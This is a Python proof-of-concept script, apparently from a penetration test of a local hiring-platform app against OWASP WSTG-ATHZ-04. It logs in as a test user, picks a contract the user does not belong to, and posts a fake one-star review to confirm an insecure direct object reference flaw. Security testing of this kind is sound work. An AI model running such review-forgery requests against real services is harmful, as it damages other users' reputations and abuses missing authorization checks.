"""
WSTG-ATHZ-04: Insecure Direct Object Reference — Review Forgery
Demonstrates that any authenticated user can create reviews on contracts
they are not a party to, enabling fake review injection.
Expected: 200 response creating a review on another user's contract.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login as the test client
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "testclient@hireflow.com",
    "password": "password123"
})
client_token = login.json()["token"]
client_id = login.json()["user"]["id"]
print(f"[+] Logged in as client: {client_id}")

# Step 2: Find a contract the client is NOT party to
reviews_resp = requests.get(f"{BASE}/api/reviews", headers={
    "Authorization": f"Bearer {client_token}"
})
reviews = reviews_resp.json().get("reviews", [])

# Find contracts where the client is NOT the reviewer
target_contract = None
target_reviewee = None
for r in reviews:
    if r["reviewer_id"] != client_id:
        target_contract = r["contract_id"]
        target_reviewee = r["reviewee_id"]
        break

if not target_contract:
    print("[-] Could not find a suitable contract")
    exit(1)

print(f"[+] Target contract: {target_contract}")
print(f"[+] Target reviewee: {target_reviewee}")

# Step 3: Create a fake review on the contract
resp = requests.post(f"{BASE}/api/reviews", json={
    "contract_id": target_contract,
    "reviewee_id": target_reviewee,
    "rating": 1,
    "comment": "Fake review - IDOR PoC - user not party to this contract"
}, headers={
    "Authorization": f"Bearer {client_token}"
})

print(f"\n[+] Creating fake review...")
print(f"    Status: {resp.status_code}")
data = resp.json()

if resp.status_code == 200 or resp.status_code == 201:
    print(f"    Review ID: {data.get('id')}")
    print(f"    Reviewer: {data.get('reviewer_id')} (our client)")
    print(f"    Contract: {data.get('contract_id')}")
    print(f"    Rating: {data.get('rating')}")
    print(f"    Comment: {data.get('comment')}")
    print(f"\n[VULNERABLE] Review IDOR confirmed — user can write reviews on any contract")
elif "already reviewed" in str(data.get("error", "")):
    print(f"    Error: {data.get('error')}")
    print(f"\n[VULNERABLE] Review IDOR confirmed — 'already reviewed' error means authorization")
    print(f"    check happens AFTER contract-party check (which is missing)")
else:
    print(f"    Response: {data}")
    print(f"\n[NOT VULNERABLE] Review creation was rejected")
